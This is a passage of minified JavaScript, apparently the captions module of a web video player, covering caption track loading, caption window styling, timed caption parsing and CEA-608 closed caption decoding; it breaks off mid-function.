(function (g) {
  var window = this;
  'use strict';
  var ujb = function (a, b) {
      return b ? a.captionsInitialState : "CAPTIONS_INITIAL_STATE_UNKNOWN";
    },
    vjb = function (a, b) {
      var c = new g.iM();
      c.languageCode = a.languageCode;
      c.languageName = a.languageName;
      c.name = a.name;
      c.kind = a.kind;
      c.isDefault = !1;
      c.j = a.j;
      c.isTranslateable = a.isTranslateable;
      c.vssId = a.vssId;
      c.url = a.url;
      c.translationLanguage = b;
      a.xtags && (c.xtags = a.xtags);
      a.captionId && (c.captionId = a.captionId);
      return c;
    },
    wjb = function (a, b) {
      var c, d, e;
      return g.Ga(function (f) {
        if (1 == f.j) return c = a + "|" + b, g.z(f, g.tD(), 2);
        if (3 != f.j) {
          d = f.B;
          if (!d) throw g.FC("gct");
          return g.z(f, g.WM(d), 3);
        }
        e = f.B;
        return f.return(e.get("captions", c));
      });
    },
    xjb = function (a, b, c) {
      wjb(a, b).then(function (d) {
        d && c(d.trackData, new g.iM(d.metadata));
      });
    },
    Ajb = function (a) {
      if (!yjb.test(a)) throw Error("'" + a + "' is not a valid hex color");
      4 == a.length && (a = a.replace(zjb, "#$1$1$2$2$3$3"));
      a = a.toLowerCase();
      a = parseInt(a.slice(1), 16);
      return [a >> 16, a >> 8 & 255, a & 255];
    },
    Bjb = function () {
      return g.SB("yt-player-caption-display-settings");
    },
    O4 = function () {
      this.segments = [];
    },
    Cjb = function (a, b) {
      var c = g.Ob(a.segments, b);
      0 <= c || 0 > c && 1 === (-c - 1) % 2 || (c = -c - 1, 0 < c && 1 === b - a.segments[c - 1] && c < a.segments.length && 1 === a.segments[c] - b ? (g.Db(a.segments, c), g.Db(a.segments, c - 1)) : 0 < c && 1 === b - a.segments[c - 1] ? a.segments[c - 1] = b : c < a.segments.length && 1 === a.segments[c] - b ? a.segments[c] = b : (g.Lb(a.segments, c, 0, b), g.Lb(a.segments, c + 1, 0, b)));
    },
    Djb = function (a, b, c, d, e, f) {
      g.G.call(this);
      this.policy = a;
      this.player = b;
      this.ea = c;
      this.onLoadCallback = d;
      this.G = e;
      this.ma = f;
      this.D = new O4();
      this.K = -1;
      this.C = this.B = this.j = null;
      this.S = new g.fr(this.zX, 1E3, this);
      this.events = new g.tJ(this);
      g.H(this, this.S);
      g.H(this, this.events);
      this.events.V(b, "SEEK_COMPLETE", this.vA);
      this.vA();
      this.zX();
    },
    Ejb = function (a) {
      return a.j && a.j.C ? a.j.C + a.player.Id() < a.player.getCurrentTime() : !1;
    },
    Fjb = function (a, b) {
      var c = g.mva(b, a.policy, {}).lf(),
        d = {
          format: "RAW",
          withCredentials: !0
        };
      if (a.policy.Ca) {
        d.method = "POST";
        var e = b.Et(),
          f = (0, g.JX)([120, 0]);
        e && g.IM(e, g.UOa);
        d.postBody = f;
      }
      a.G && (d.responseType = "arraybuffer");
      a.C = g.KA(c, d, 3, 100).then(function (h) {
        a: {
          h = h.xhr;
          a.isDisposed();
          if (a.B) {
            var l = !(a.G ? h.response : h.responseText) || 400 <= h.status,
              m = g.vwa(h);
            if (m) {
              h = g.mva(a.B, a.policy, {});
              a.B.Sk(h, m);
              Fjb(a, a.B);
              break a;
            }
            if (l) a.player.Ba("capfail", {
              status: h.status
            });else if (a.player.ri().Ki("fcb_r"), m = a.B.ib[0].Qa, null != a.onLoadCallback && a.K !== m) {
              l = a.B.ib[0];
              if (a.G) a.onLoadCallback(h.response, 1E3 * (l.startTime + a.player.Id()));else a.onLoadCallback(h.responseText, 1E3 * (l.startTime + a.player.Id()));
              a.K = m;
            }
          }
          a.B = null;
          a.C = null;
        }
      }).Bk(function (h) {
        a.B = null;
        a.C = null;
        var l;
        a.player.Ba("capfail", {
          status: null == (l = h.xhr) ? void 0 : l.status
        });
      });
      a.B = b;
      Cjb(a.D, a.B.ib[0].Qa);
    },
    P4 = function (a, b) {
      g.gT.call(this, b.W());
      this.B = a;
      this.J = b;
      this.C = null;
      this.G = !1;
      this.K = g.SL(this.J.W()) && !this.B.isManifestless;
    },
    Hjb = function (a, b) {
      var c = [],
        d;
      for (d in a.B.j) if (a.B.j.hasOwnProperty(d)) {
        var e = a.B.j[d];
        if (g.vPa(e, b || null)) {
          var f = e.info.id,
            h = f,
            l = "." + f,
            m = "",
            n = "",
            p = "";
          if (e = e.info.captionTrack) f = e.languageCode, h = e.displayName, l = e.vssId, m = e.kind, a.J.W().N("html5_expose_xtags_through_caption_track") && (n = e.xtags), p = e.id;else {
            e = f;
            var q = g.uhb.get(e);
            null == q && (q = Gjb[e] || Gjb[e.replace(/-/g, "_")], g.uhb.set(e, q));
            h = q || h;
          }
          c.push(new g.iM({
            id: d,
            languageCode: f,
            languageName: h,
            is_servable: !0,
            is_default: !0,
            is_translateable: !1,
            vss_id: l,
            kind: m,
            xtags: n,
            captionId: p
          }));
        }
      }
      return c;
    },
    Ijb = function (a, b) {
      return null != b && b in a.B.j ? a.B.j[b] : null;
    },
    Jjb = function (a, b, c) {
      var d = [],
        e;
      for (e in a.B.j) if (a.B.j.hasOwnProperty(e)) {
        var f = a.B.j[e];
        if (g.vPa(f, c || null)) {
          var h = f.info.captionTrack;
          h && h.languageCode === b && d.push(f);
        }
      }
      return d.length ? d[0] : null;
    },
    Ljb = function () {
      var a = void 0;
      a = void 0 === a ? {} : a;
      var b = "suggest_correction" in Kjb ? Kjb.suggest_correction : "Edit caption";
      b = b || "";
      var c = {},
        d;
      for (d in a) {
        c = {
          PD: c.PD
        };
        c.PD = d;
        var e = function (f) {
          return function () {
            return String(a[f.PD]);
          };
        }(c);
        b = b.replace(new RegExp("\\$\\{" + c.PD + "\\}", "gi"), e);
        b = b.replace(new RegExp("\\$" + c.PD, "gi"), e);
      }
      return b;
    },
    Q4 = function (a, b, c, d, e, f, h, l, m, n) {
      var p = n.isInline() && n.N("web_imp_caption_window"),
        q = {};
      p && (q.windowOpacity = .75);
      Object.assign(q, b);
      Object.assign(q, a.params);
      Object.assign(q, c);
      var t = {};
      p && (t.backgroundOpacity = 0);
      Object.assign(t, b.Xe);
      a.params.Xe && Object.assign(t, a.params.Xe);
      Object.assign(t, c.Xe);
      q.Xe = t;
      var u = 1 === q.Ji,
        y = [{
          I: "span",
          T: "captions-text",
          Y: {
            style: "word-wrap: normal; display: block;"
          }
        }],
        A,
        E,
        L;
      (l = l.rb("caption_edit_on_hover") && (null == (A = n.getVideoData().getPlayerResponse()) ? void 0 : null == (E = A.captions) ? void 0 : null == (L = E.playerCaptionsTracklistRenderer) ? void 0 : L.openTranscriptCommand)) && y.unshift({
        I: "button",
        T: "caption-edit",
        Y: {
          tabindex: "0",
          "aria-label": Ljb()
        },
        X: [{
          I: "svg",
          Y: {
            fill: "#e3e3e3",
            height: "100%",
            viewBox: "5 5 38 38",
            width: "100%"
          },
          X: [{
            I: "path",
            Y: {
              d: "M9 39h2.2l24.25-24.25-1.1-1.1-1.1-1.1L9 36.8Zm-3 3v-6.4L35.4 6.2q.85-.85 2.12-.82 1.27.02 2.12.87L41.8 8.4q.85.85.85 2.1t-.85 2.1L12.4 42Zm33.5-31.55L37.45 8.4Zm-4.05 4.3-1.1-1.1-1.1-1.1 2.2 2.2Z"
            }
          }]
        }]
      });
      g.X.call(this, {
        I: "div",
        T: "caption-window",
        Y: {
          id: "caption-window-" + a.id,
          dir: u ? "rtl" : "ltr",
          tabindex: "0",
          lang: q.lang
        },
        X: y
      });
      var I = this;
      this.K = [];
      this.Ga = !1;
      this.B = a;
      this.Pa = this.Oa = null;
      this.playerWidth = f;
      this.playerHeight = h;
      this.S = null;
      this.maxWidth = .96 * f;
      this.maxHeight = .96 * h;
      this.j = q;
      this.Bd = c;
      this.Ca = b;
      this.D = this.Ia("captions-text");
      this.zc = "" !== this.D.style.getPropertyValue("box-decoration-break") || "" !== this.D.style.getPropertyValue("-webkit-box-decoration-break");
      this.Va = Mjb(d, e, f, h);
      this.Tc = m;
      l && (this.G = this.Ia("caption-edit"), this.V(this.G, "click", function () {
        I.Tc();
      }));
      this.type = 0;
      this.kb = this.Va * Njb(t);
      this.Wc = p;
      a = new g.HS(this.element, !0);
      g.H(this, a);
      a.subscribe("dragstart", this.m1, this);
      a.subscribe("dragmove", this.l1, this);
      a.subscribe("dragend", this.j1, this);
      this.tb = this.ob = this.Hb = this.zb = 0;
      a = "";
      this.j.windowOpacity && (a = Ajb(this.j.windowColor), a = "rgba(" + a[0] + "," + a[1] + "," + a[2] + "," + this.j.windowOpacity + ")");
      b = {
        "background-color": a,
        display: !1 === this.j.isVisible ? "none" : "",
        "text-align": Ojb[this.j.textAlign]
      };
      this.zc && (b["border-radius"] = a ? this.kb / 8 + "px" : "");
      (this.C = 2 === this.B.params.Ji || 3 === this.B.params.Ji) && Pjb(this, this.element);
      g.zo(this.element, b);
      switch (this.j.fm) {
        case 0:
        case 1:
        case 2:
          g.nr(this.element, "ytp-caption-window-top");
          break;
        case 6:
        case 7:
        case 8:
          g.nr(this.element, "ytp-caption-window-bottom");
      }
    },
    Pjb = function (a, b) {
      var c = "vertical-rl";
      1 === a.j.yR && (c = "vertical-lr");
      g.Pe && (c = "vertical-lr" === c ? "tb-lr" : "tb-rl");
      g.zo(b, "-o-writing-mode", c);
      g.zo(b, "-webkit-writing-mode", c);
      g.zo(b, "writing-mode", c);
      g.zo(b, "text-orientation", "upright");
      g.nr(b, "ytp-vertical-caption");
      3 === a.B.params.Ji && (g.zo(b, "text-orientation", ""), g.zo(b, "transform", "rotate(180deg)"));
    },
    Njb = function (a) {
      var b = 1 + .25 * (a.fontSizeIncrement || 0);
      if (0 === a.offset || 2 === a.offset) b *= .8;
      return b;
    },
    Qjb = function (a, b) {
      var c = {},
        d = b.background ? b.background : a.j.Xe.background;
      if (null != b.backgroundOpacity || b.background) {
        var e = null != b.backgroundOpacity ? b.backgroundOpacity : a.j.Xe.backgroundOpacity;
        d = Ajb(d);
        c.background = "rgba(" + d[0] + "," + d[1] + "," + d[2] + "," + e + ")";
        a.zc && (c["box-decoration-break"] = "clone", c["border-radius"] = a.kb / 8 + "px");
      }
      if (null != b.fontSizeIncrement || null != b.offset) c["font-size"] = a.Va * Njb(b) + "px";
      d = 1;
      e = b.color || a.j.Xe.color;
      if (b.color || null != b.textOpacity) e = Ajb(e), d = null == b.textOpacity ? a.j.Xe.textOpacity : b.textOpacity, e = "rgba(" + e[0] + "," + e[1] + "," + e[2] + "," + d + ")", c.color = e, c.fill = e;
      var f = b.charEdgeStyle;
      0 === f && (f = void 0);
      if (f) {
        e = "rgba(34, 34, 34, " + d + ")";
        var h = "rgba(204, 204, 204, " + d + ")";
        b.mM && (h = e = b.mM);
        var l = a.Va / 16 / 2,
          m = Math.max(l, 1),
          n = Math.max(2 * l, 1),
          p = Math.max(3 * l, 1),
          q = Math.max(5 * l, 1);
        d = [];
        switch (f) {
          case 4:
            for (; p <= q; p += l) d.push(n + "px " + n + "px " + p + "px " + e);
            break;
          case 1:
            n = 2 <= window.devicePixelRatio ? .5 : 1;
            for (f = m; f <= p; f += n) d.push(f + "px " + f + "px " + e);
            break;
          case 2:
            d.push(m + "px " + m + "px " + h);
            d.push("-" + m + "px -" + m + "px " + e);
            break;
          case 3:
            for (p = 0; 5 > p; p++) d.push("0 0 " + n + "px " + e);
        }
        c["text-shadow"] = d.join(", ");
      }
      e = "";
      switch (b.fontFamily) {
        case 1:
          e = '"Courier New", Courier, "Nimbus Mono L", "Cutive Mono", monospace';
          break;
        case 2:
          e = '"Times New Roman", Times, Georgia, Cambria, "PT Serif Caption", serif';
          break;
        case 3:
          e = '"Deja Vu Sans Mono", "Lucida Console", Monaco, Consolas, "PT Mono", monospace';
          break;
        case 5:
          e = '"Comic Sans MS", Impact, Handlee, fantasy';
          break;
        case 6:
          e = '"Monotype Corsiva", "URW Chancery L", "Apple Chancery", "Dancing Script", cursive';
          break;
        case 7:
          e = g.YA() ? '"Carrois Gothic SC", sans-serif-smallcaps' : '"Arial Unicode Ms", Arial, Helvetica, Verdana, "Marcellus SC", sans-serif';
          break;
        case 0:
        case 4:
          e = '"YouTube Noto", Roboto, "Arial Unicode Ms", Arial, Helvetica, Verdana, "PT Sans Caption", sans-serif';
      }
      e && (c["font-family"] = e);
      e = b.offset;
      null == e && (e = a.j.Xe.offset);
      switch (e) {
        case 0:
          c["vertical-align"] = "sub";
          break;
        case 2:
          c["vertical-align"] = "super";
      }
      7 === b.fontFamily && (c["font-variant"] = "small-caps");
      b.bold && (c["font-weight"] = "bold");
      b.italic && (c["font-style"] = "italic");
      b.underline && (c["text-decoration"] = "underline");
      b.A6 && (c.visibility = "hidden");
      1 === b.PW && a.C && (c["text-combine-upright"] = "all", c["text-orientation"] = "mixed", e = g.UL || g.DC, 3 === a.B.params.Ji ? c.transform = e ? "rotate(90deg)" : "rotate(180deg)" : e && (c.transform = "rotate(-90deg)"));
      if (1 === b.uo || 2 === b.uo || 3 === b.uo || 4 === b.uo || 5 === b.uo) if (g.UL) c["font-weight"] = "bold";else switch (c["text-emphasis-style"] = "filled circle", c["text-emphasis-color"] = "currentcolor", c["webkit-text-emphasis"] = "filled circle", b.uo) {
        case 4:
        case 3:
          c["text-emphasis-position"] = "under left";
          c["webkit-text-emphasis-position"] = "under left";
          break;
        case 5:
        case 2:
          c["text-emphasis-position"] = "over right", c["webkit-text-emphasis-position"] = "over right";
      }
      return c;
    },
    Rjb = function (a) {
      a.S = g.Te("SPAN");
      g.zo(a.S, {
        display: "block"
      });
      g.nr(a.S, "caption-visual-line");
      a.D.appendChild(a.S);
    },
    Sjb = function (a, b) {
      var c = g.Te("SPAN");
      g.zo(c, {
        display: "inline-block",
        "white-space": "pre-wrap"
      });
      g.zo(c, Qjb(a, b));
      c.classList.add("ytp-caption-segment");
      a.S.appendChild(c);
      c.previousElementSibling && (g.zo(c.previousElementSibling, {
        "border-top-right-radius": "0",
        "border-bottom-right-radius": "0"
      }), g.zo(c, {
        "border-top-left-radius": "0",
        "border-bottom-left-radius": "0"
      }));
      return c;
    },
    Tjb = function (a, b, c) {
      a.Ga = a.Ga || !!c;
      var d = {};
      Object.assign(d, a.j.Xe);
      Object.assign(d, c || b.j);
      Object.assign(d, a.Bd.Xe);
      (c = !a.S) && Rjb(a);
      for (var e = a.Oa && a.Pa && g.gd(d, a.Pa) ? a.Oa : Sjb(a, d), f = "string" === typeof b.text, h = f ? b.text.split("\n") : [b.text], l = 0; l < h.length; l++) {
        var m = 0 < l || !b.append,
          n = h[l];
        m && !c ? (Rjb(a), e = Sjb(a, d)) : m && c && (c = !1);
        n && (e.appendChild(f ? g.Ue(n) : n), f || "RUBY" !== n.tagName || 4 !== n.childElementCount || g.UL || !g.Bo(n.children[2], "text-emphasis") || (m = a.C ? "padding-right" : "padding-top", g.Bo(n.children[2], "text-emphasis-position") && (m = a.C ? "padding-left" : "padding-bottom"), g.Nc ? g.zo(e, m, "1em") : g.zo(e, m, "0.5em")));
      }
      a.Pa = d;
      a.Oa = e;
      a.K.push(b);
    },
    Mjb = function (a, b, c, d) {
      var e = b / 360 * 16;
      b >= a && (a = 640, d > 1.3 * c && (a = 480), e = c / a * 16);
      return e;
    },
    R4 = function (a, b, c, d) {
      g.gT.call(this, a);
      this.videoData = b;
      this.audioTrack = c;
      this.bb = d;
      this.D = b.Bx;
    },
    S4 = function (a, b, c, d, e, f, h, l, m, n) {
      Q4.call(this, a, b, c, d, e, f, h, l, m, n);
      this.type = 1;
    },
    T4 = function (a, b, c, d, e, f, h, l, m, n) {
      Q4.call(this, a, b, c, d, e, f, h, l, m, n);
      var p = this;
      this.type = 2;
      this.ea = [];
      this.ra = this.va = this.Za = 0;
      this.Ja = NaN;
      this.Zb = 0;
      this.Ac = null;
      this.fb = new g.fr(this.B9, 433, this);
      this.G && (n.xb(this.G, this, 167342), this.V(this.G, "click", function () {
        n.ub(p.G);
      }), a = new g.HS(this.element, !0), g.H(this, a), a.subscribe("hoverstart", function () {
        n.Ya(p.G, !0);
      }, this));
      g.nr(this.element, "ytp-caption-window-rollup");
      g.H(this, this.fb);
      g.zo(this.element, "overflow", "hidden");
    },
    Ujb = function (a, b) {
      if (!b) return "";
      a.C && 1 !== a.B.params.yR && (b *= -1);
      return "translate" + (a.C ? "X" : "Y") + "(" + b + "px)";
    },
    Vjb = function (a) {
      a.ea = Array.from(document.getElementsByClassName("caption-visual-line"));
      for (var b = a.B.params.Lr, c = 0, d = 0, e = a.ea.length - 1; c < b && -1 < e;) {
        var f = a.ea[e];
        d += a.C ? f.offsetWidth : f.offsetHeight;
        c++;
        e--;
      }
      a.ea.length < b && (d *= b / a.ea.length);
      a.va = d;
      b = Math;
      c = b.max;
      isNaN(a.Ja) && ((d = a.j.Rs) ? (e = g.Te("SPAN"), g.jf(e, "\u2013".repeat(d)), g.zo(e, Qjb(a, a.j.Xe)), a.D.appendChild(e), a.Ja = e.offsetWidth, a.D.removeChild(e)) : a.Ja = 0);
      d = a.D;
      a.ra = c.call(b, a.Ja, a.Zb, (a.C ? d.offsetHeight : d.offsetWidth) + 1);
    },
    Wjb = function (a, b) {
      Vjb(a);
      var c = a.ea.reduce(function (e, f) {
        return (a.C ? f.offsetWidth : f.offsetHeight) + e;
      }, 0);
      c = a.va - c;
      if (c !== a.Za) {
        var d = 0 < c && 0 === a.Za;
        b || isNaN(c) || d || (g.nr(a.element, "ytp-rollup-mode"), g.gr(a.fb));
        g.zo(a.D, "transform", Ujb(a, c));
        a.Za = c;
      }
      Vjb(a);
    },
    U4 = function (a, b, c, d, e, f, h) {
      f = void 0 === f ? !1 : f;
      h = void 0 === h ? null : h;
      g.nG.call(this, a, a + b, {
        priority: c,
        namespace: "captions"
      });
      this.windowId = d;
      this.text = e;
      this.append = f;
      this.j = h;
    },
    V4 = function (a, b, c, d, e) {
      g.nG.call(this, a, a + b, {
        priority: c,
        namespace: "captions"
      });
      this.id = d;
      this.params = e;
      this.j = [];
    },
    Xjb = function (a) {
      var b = "_" + W4++;
      return new V4(0, 0x8000000000000, 0, b, a);
    },
    Zjb = function (a, b, c, d, e, f, h) {
      var l = f[0],
        m = h[l.getAttribute("p")];
      if (1 === m.eg) {
        var n = f[1],
          p = f[2];
        f = f[3];
        l.getAttribute("t");
        n.getAttribute("t");
        p.getAttribute("t");
        f.getAttribute("t");
        l.getAttribute("p");
        n.getAttribute("p");
        f.getAttribute("p");
        h = h[p.getAttribute("p")];
        l = Yjb(l.textContent, n.textContent, p.textContent, f.textContent, h);
        return new U4(a, b, e, c, l, d, m);
      }
      switch (m.eg) {
        case 9:
        case 10:
          m.uo = 1;
          break;
        case 11:
          m.uo = 2;
          break;
        case 12:
          m.uo = 3;
          break;
        case 13:
          m.uo = 4;
          break;
        case 14:
          m.uo = 5;
      }
      return new U4(a, b, e, c, l.textContent || "", d, m);
    },
    Yjb = function (a, b, c, d, e) {
      var f = g.YA(),
        h = f ? g.Te("DIV") : g.Te("RUBY"),
        l = g.Te("SPAN");
      l.textContent = a;
      h.appendChild(l);
      a = f ? g.Te("DIV") : g.Te("RP");
      a.textContent = b;
      h.appendChild(a);
      b = f ? g.Te("DIV") : g.Te("RT");
      b.textContent = c;
      h.appendChild(b);
      c = e.eg;
      if (10 === c || 11 === c || 12 === c || 13 === c || 14 === c) if (g.zo(b, "text-emphasis-style", "filled circle"), g.zo(b, "text-emphasis-color", "currentcolor"), g.zo(b, "webkit-text-emphasis", "filled circle"), 11 === e.eg || 13 === e.eg) g.zo(b, "webkit-text-emphasis-position", "under left"), g.zo(b, "text-emphasis-position", "under left");
      c = !0;
      if (4 === e.eg || 7 === e.eg || 12 === e.eg || 14 === e.eg) g.zo(h, "ruby-position", "over"), g.zo(h, "-webkit-ruby-position", "before");else if (5 === e.eg || 6 === e.eg || 11 === e.eg || 13 === e.eg) g.zo(h, "ruby-position", "under"), g.zo(h, "-webkit-ruby-position", "after"), c = !1;
      e = f ? g.Te("DIV") : g.Te("RP");
      e.textContent = d;
      h.appendChild(e);
      f && (d = c, g.zo(h, {
        display: "inline-block",
        position: "relative"
      }), f = h.firstElementChild.nextElementSibling, g.zo(f, "display", "none"), f = f.nextElementSibling, g.zo(f, {
        "font-size": "0.5em",
        "line-height": "1.2em",
        "text-align": "center",
        position: "absolute",
        left: "50%",
        transform: "translateX(-50%)",
        width: "400%"
      }), g.zo(h.lastElementChild, "display", "none"), d ? (g.zo(h, "padding-top", "0.6em"), g.zo(f, "top", "0")) : (g.zo(h, "padding-bottom", "0.6em"), g.zo(f, "bottom", "0")));
      return h;
    },
    X4 = function () {
      g.G.apply(this, arguments);
    },
    Y4 = function (a) {
      X4.call(this);
      this.D = a;
      this.pens = {};
      this.ma = {};
      this.ea = {};
      this.G = "_" + W4++;
      this.S = {};
      this.C = this.j = null;
      this.K = !0;
    },
    Z4 = function (a, b) {
      a = a.getAttribute(b);
      if (null != a) return Number(a);
    },
    $4 = function (a, b) {
      a = a.getAttribute(b);
      if (null != a) return "1" === a;
    },
    a5 = function (a, b) {
      a = Z4(a, b);
      return void 0 !== a ? a : null;
    },
    c5 = function (a, b) {
      a = a.getAttribute(b);
      if (null != a) return b5.test(a), a;
    },
    $jb = function (a, b) {
      var c = {},
        d = b.getAttribute("ws");
      Object.assign(c, d ? a.ea[d] : a.D);
      a = a5(b, "mh");
      null != a && (c.kA = a);
      a = a5(b, "ju");
      null != a && (c.textAlign = a);
      a = a5(b, "pd");
      null != a && (c.Ji = a);
      a = a5(b, "sd");
      null != a && (c.yR = a);
      a = c5(b, "wfc");
      null != a && (c.windowColor = a);
      b = Z4(b, "wfo");
      void 0 !== b && (c.windowOpacity = b / 255);
      return c;
    },
    akb = function (a, b) {
      var c = {},
        d = b.getAttribute("wp");
      d && Object.assign(c, a.ma[d]);
      a = a5(b, "ap");
      null != a && (c.fm = a);
      a = Z4(b, "cc");
      null != a && (c.Rs = a);
      a = Z4(b, "ah");
      null != a && (c.jk = a);
      a = Z4(b, "rc");
      null != a && (c.Lr = a);
      b = Z4(b, "av");
      null != b && (c.xo = b);
      return c;
    },
    bkb = function (a, b, c, d) {
      var e = {};
      Object.assign(e, akb(a, b));
      Object.assign(e, $jb(a, b));
      d ? g.gd(e, a.D) ? (d = a.G, e = a.D) : d = "_" + W4++ : d = b.getAttribute("id") || "_" + W4++;
      a = Z4(b, "t") + c;
      b = Z4(b, "d") || 0x8000000000000;
      if (2 === e.Ji || 3 === e.Ji) c = e.Lr, e.Lr = e.Rs, e.Rs = c;
      return new V4(a, b, 0, d, e);
    },
    d5 = function (a) {
      X4.call(this);
      this.K = a;
      this.j = new Map();
      this.D = new Map();
      this.G = new Map();
      this.C = new Map();
    },
    e5 = function (a) {
      a = g.oe(Math.round(a), 0, 16777215).toString(16).toUpperCase();
      return "#000000".substr(0, 7 - a.length) + a;
    },
    ckb = function (a, b, c, d, e) {
      0 === d && (d = 0x8000000000000);
      var f = {};
      b.wpWinPosId && Object.assign(f, a.D.get(b.wpWinPosId));
      b.wsWinStyleId && Object.assign(f, a.G.get(b.wsWinStyleId));
      a = b.rcRowCount;
      void 0 !== a && (f.Lr = a);
      b = b.ccColCount;
      void 0 !== b && (f.Rs = b);
      if (2 === f.Ji || 3 === f.Ji) b = f.Lr, f.Lr = f.Rs, f.Rs = b;
      return new V4(c, d, 0, e, f);
    },
    ekb = function () {
      this.C = this.time = this.mode = this.B = 0;
      this.D = new dkb(this);
      this.G = new dkb(this);
      this.j = [];
      this.clear();
    },
    gkb = function (a, b, c) {
      if (255 === a && 255 === b || !a && !b) return {
        tv: a,
        Ns: b,
        result: 0
      };
      a = fkb[a];
      b = fkb[b];
      if (a & 128) {
        var d;
        if (d = !(b & 128)) d = b, d = c.He() && c.Ns === d;
        if (d) return {
          tv: a,
          Ns: b,
          result: 1
        };
      } else if (b & 128 && 1 <= a && 31 >= a) return {
        tv: a,
        Ns: b,
        result: 2
      };
      return {
        tv: a,
        Ns: b,
        result: 3
      };
    },
    ikb = function (a, b, c, d) {
      255 === b && 255 === c || !b && !c ? (45 === ++a.C && a.reset(), a.D.B.clear(), a.G.B.clear()) : (a.C = 0, hkb(a.D, b, c, d));
    },
    jkb = function (a, b) {
      a.j.sort(function (e, f) {
        var h = e.time - f.time;
        return 0 === h ? e.order - f.order : h;
      });
      for (var c = g.v(a.j), d = c.next(); !d.done; d = c.next()) d = d.value, a.time = d.time, 0 === d.type ? ikb(a, d.TU, d.UU, b) : 1 === d.type && a.B & 496 && hkb(a.G, d.TU, d.UU, b);
      a.j.length = 0;
    },
    f5 = function () {
      this.type = 0;
    },
    g5 = function () {
      this.state = this.Ns = this.tv = 0;
    },
    kkb = function () {
      this.timestamp = this.j = 0;
    },
    h5 = function (a) {
      this.D = a;
      this.B = [];
      this.j = this.col = this.row = 0;
      this.style = new f5();
      for (a = this.C = 0; 15 >= a; a++) {
        this.B[a] = [];
        for (var b = 0; 32 >= b; b++) this.B[a][b] = new kkb();
      }
    },
    i5 = function (a, b) {
      if (3 === a.style.type) {
        for (var c = 0, d = 0, e = a.D.time + 0, f = "", h = "", l = e, m = 1; 15 >= m; ++m) {
          for (var n = !1, p = d ? d : 1; 32 >= p; ++p) {
            var q = a.B[m][p];
            if (0 !== q.j) {
              0 === c && (c = m, d = p);
              n = String.fromCharCode(q.j);
              var t = q.timestamp;
              t < e && (e = t);
              q.timestamp = l;
              h && (f += h, h = "");
              f += n;
              n = !0;
            }
            if ((0 === q.j || 32 === p) && n) {
              h = "\n";
              break;
            } else if (d && !n) break;
          }
          if (c && !n) break;
        }
        f && b.D(c, d, e, l, f);
      } else for (d = c = 0, f = e = a.D.time + 0, h = 1; 15 >= h; ++h) for (l = "", m = 1; 32 >= m; ++m) if (p = a.B[h][m], q = p.j, 0 !== q && (0 === c && (c = h, d = m), n = String.fromCharCode(q), t = p.timestamp, t <= e && (e = t), l += n, p.reset()), 32 === m || 0 === q) l && b.D(c, d, e, f, l), e = f, l = "", d = c = 0;
    },
    pkb = function (a, b) {
      switch (a) {
        case 0:
          return lkb[(b & 127) - 32];
        case 1:
          return mkb[b & 15];
        case 2:
          return nkb[b & 31];
        case 3:
          return okb[b & 31];
      }
      return 0;
    },
    j5 = function (a) {
      return a.B[a.row][a.col];
    },
    k5 = function (a, b, c) {
      2 <= b && 1 < a.col && (--a.col, j5(a).j = 0);
      var d = j5(a);
      d.timestamp = a.D.time + 0;
      d.j = pkb(b, c);
      32 > a.col && a.col++;
    },
    qkb = function (a, b, c, d) {
      for (var e = 0; e < d; e++) for (var f = 0; 32 >= f; f++) {
        var h = a.B[b + e][f],
          l = a.B[c + e][f];
        h.j = l.j;
        h.timestamp = l.timestamp;
      }
    },
    l5 = function (a, b, c) {
      for (var d = 0; d < c; d++) for (var e = 0; 32 >= e; e++) a.B[b + d][e].reset();
    },
    rkb = function (a) {
      a.row = 0 < a.j ? a.j : 1;
      a.col = 1;
      l5(a, 0, 15);
    },
    skb = function (a) {
      this.C = a;
      this.G = 0;
      this.style = new f5();
      this.K = new h5(this.C);
      this.S = new h5(this.C);
      this.text = new h5(this.C);
      this.B = this.K;
      this.D = this.S;
      this.j = this.B;
    },
    tkb = function (a, b, c) {
      var d = a.B,
        e = !1;
      switch (a.style.get()) {
        case 4:
        case 1:
        case 2:
          4 === a.style.get() && 0 < d.j || (i5(d, c), rkb(a.B), rkb(a.D), d.row = 15, d.j = b, e = !0);
      }
      a.style.set(3);
      a.j = d;
      a.j.style = a.style;
      a.C.mode = 1 << d.C;
      e ? d.col = 1 : d.j !== b && (d.j > b ? (i5(d, c), l5(d, d.row - d.j, b)) : d.row < b && (b = d.j), d.j = b);
    },
    ukb = function (a) {
      a.style.set(1);
      a.j = a.D;
      a.j.j = 0;
      a.j.style = a.style;
      a.C.mode = 1 << a.j.C;
    },
    vkb = function (a) {
      a.style.set(4);
      a.j = a.text;
      a.j.style = a.style;
      a.C.mode = 1 << a.j.C;
    },
    dkb = function (a) {
      this.j = a;
      this.G = 0;
      this.C = new skb(this.j);
      this.K = new skb(this.j);
      this.B = new g5();
      this.D = this.C;
    },
    hkb = function (a, b, c, d) {
      a.B.update();
      b = gkb(b, c, a.B);
      switch (b.result) {
        case 0:
          return;
        case 1:
        case 2:
          return;
      }
      var e = b.tv;
      c = b.Ns;
      if (32 <= e || !e) a.j.mode & a.j.B && (b = e, b & 128 && (b = 127), c & 128 && (c = 127), a = a.D.j, b & 96 && k5(a, 0, b), c & 96 && k5(a, 0, c), 0 !== b && 0 !== c && 3 === a.style.type && i5(a, d));else if (e & 16) a: if (!a.B.matches(e, c) && (b = a.B, b.tv = e, b.Ns = c, b.state = 2, b = e & 8 ? a.K : a.C, a.D = b, a.j.mode = 1 << (a.G << 2) + (b.G << 1) + (4 === b.style.type ? 1 : 0), (a.j.mode | 1 << (a.G << 2) + (b.G << 1) + (4 !== b.style.type ? 1 : 0)) & a.j.B)) if (c & 64) {
        d = [11, 11, 1, 2, 3, 4, 12, 13, 14, 15, 5, 6, 7, 8, 9, 10][(e & 7) << 1 | c >> 5 & 1];
        a = c & 16 ? 4 * ((c & 14) >> 1) : 0;
        c = b.j;
        switch (b.style.get()) {
          case 4:
            d = c.row;
            break;
          case 3:
            if (d !== c.row) {
              if (d < c.j && (d = c.j, d === c.row)) break;
              var f = 1 + c.row - c.j,
                h = 1 + d - c.j;
              qkb(c, h, f, c.j);
              b = f;
              e = c.j;
              h < f ? (f = h + e - f, 0 < f && (b += f, e -= f)) : (f = f + e - h, 0 < f && (e -= f));
              l5(c, b, e);
            }
        }
        c.row = d;
        c.col = a + 1;
      } else switch (e & 7) {
        case 1:
          switch (c & 112) {
            case 32:
              k5(b.j, 0, 32);
              break a;
            case 48:
              57 === c ? (d = b.j, j5(d).j = 0, 32 > d.col && d.col++) : k5(b.j, 1, c & 15);
          }
          break;
        case 2:
